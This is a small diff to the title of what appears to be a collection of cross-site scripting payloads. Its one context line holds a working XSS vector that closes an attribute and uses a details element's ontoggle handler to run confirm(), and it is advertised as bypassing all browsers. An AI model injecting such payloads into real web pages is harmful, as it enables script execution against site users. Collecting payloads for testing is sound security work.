@@ -1,4 +1,4 @@
-# XSS 0DAY Mixtape(收集一堆关于XSS的子弹，有任何建议在微博找我weibo@flagellantX)
+# XSS 0DAY Mixtape(收集XSS的子弹，有任何建议在微博找我weibo@flagellantX)
 
 
 ">'><details/open/ontoggle=confirm('flagellantX')> //Bypass All Browser Like Chrome,Firefox,Yandex,all...
